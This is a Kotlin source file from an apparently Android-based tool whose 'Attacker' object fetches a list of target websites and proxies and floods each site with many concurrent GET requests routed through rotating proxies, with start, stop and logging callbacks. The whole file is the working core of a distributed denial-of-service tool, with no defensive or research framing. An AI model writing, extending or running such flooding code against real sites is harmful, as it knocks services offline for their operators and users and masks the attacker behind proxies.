package com.bodiart.attack

import android.util.Log
import com.bodiart.attack.model.entity.data.AttackConfig
import com.bodiart.attack.model.entity.data.RequestMethod
import com.bodiart.attack.model.entity.data.RequestResponse
import com.bodiart.attack.model.entity.data.WebsiteAndProxies
import com.bodiart.attack.model.entity.data.proxy.ProxyInfo
import com.bodiart.attack.model.entity.data.website.Website
import com.bodiart.attack.model.usecase.AttackUseCase
import com.bodiart.attack.model.usecase.WebsitesAndProxiesGetUseCase
import io.github.bodiart.utils.util.extensions.process
import kotlinx.coroutines.*

object Attacker {
    private val tag = Attacker::class.java.simpleName

    private var attackJob: Job? = null
    private var isEnabled = false

    private var websitesAndProxies: List<WebsiteAndProxies> = listOf()

    var attackEnableStatusCallback: (Boolean) -> Unit = {}

    var websitesGetFailedCallback: (Throwable) -> Unit = {}
    var websitesEmptyCallback: () -> Unit = {}

    var handleRequestResponseCallback: (RequestResponse) -> Unit = {}
    var handleRequestErrorCallback: (url: String, Throwable) -> Unit = { _, _ -> }

    var allThreadExecutedCallback: (url: String) -> Unit = {}

    fun startAttack(
        coroutineScope: CoroutineScope,
        asyncRequestCount: Int,
        delayBetweenAllThreadsExecutedMillis: Long
    ): Job {
        setEnabled(true)
        return coroutineScope.launch {
            // setup websites and proxies
            if (!setupWebsitesAndProxies()) {
                setEnabled(false)
                return@launch
            }
            // start attack for websites
            websitesAndProxies.forEach { websiteAndProxies ->
                performAttackForWebsite(
                    websiteAndProxies.website,
                    websiteAndProxies.proxies,
                    asyncRequestCount,
                    delayBetweenAllThreadsExecutedMillis,
                    this
                )
            }

        }.apply { attackJob = this }
    }

    fun stopAttack() {
        setEnabled(false)
    }

    /**
     * Returns is success
     */
    private suspend fun setupWebsitesAndProxies(): Boolean = withContext(Dispatchers.IO) {
        if (!handleWebsitesAndProxies(WebsitesAndProxiesGetUseCase().perform())) {
            return@withContext false
        }

        // remove website if proxies list is empty
        websitesAndProxies = ArrayList(websitesAndProxies).apply {
            removeIf {
                it.proxies.isEmpty().apply {
                    if (this) {
                        Log.d(tag, "removing website from list, proxy list is empty")
                    }
                }
            }
        }

        // check is websites empty
        if (websitesAndProxies.isEmpty()) {
            websitesEmptyCallback()
            return@withContext false
        }

        true
    }

    private fun handleWebsitesAndProxies(websitesResult: Result<List<WebsiteAndProxies>>): Boolean {
        websitesResult.process(
            {
                websitesAndProxies = it
            },
            {
                websitesGetFailedCallback(it)
            }
        )
        return websitesResult.isSuccess
    }

    private fun performAttackForWebsite(
        website: Website,
        proxies: List<ProxyInfo>,
        asyncRequestCount: Int,
        delayBetweenAllThreadsExecutedMillis: Long,
        coroutineScope: CoroutineScope
    ): Job {
        return AttackUseCase().perform(
            coroutineScope,
            AttackConfig(
                website.url,
                RequestMethod.GET,
                mapOf(),
                null,
                null,
                delayBetweenAllThreadsExecutedMillis,
                proxies
            ),
            asyncRequestCount,
            handleRequestResponseCallback = {
                handleRequestResponseCallback(it)
                Log.d(tag, "request succeed code=${it.code} url=${website.url} proxy=${it.proxy?.url}:${it.proxy?.port}")
            },
            handleRequestErrorCallback = { throwable, proxy ->
                handleRequestErrorCallback(website.url ,throwable)
                Log.d(tag, "request failed code=${throwable.message} url=${website.url} proxy=${proxy?.url}:${proxy?.port}")
            },
            allThreadsExecutedCallback = {
                allThreadExecutedCallback(it)
                Log.d(tag, "all threads executed $it")
            }
        )
    }

    private fun setEnabled(enabled: Boolean) {
        isEnabled = enabled
        attackEnableStatusCallback(isEnabled)
        if (!isEnabled) {
            attackJob?.cancel()
            attackJob = null
        }
    }

}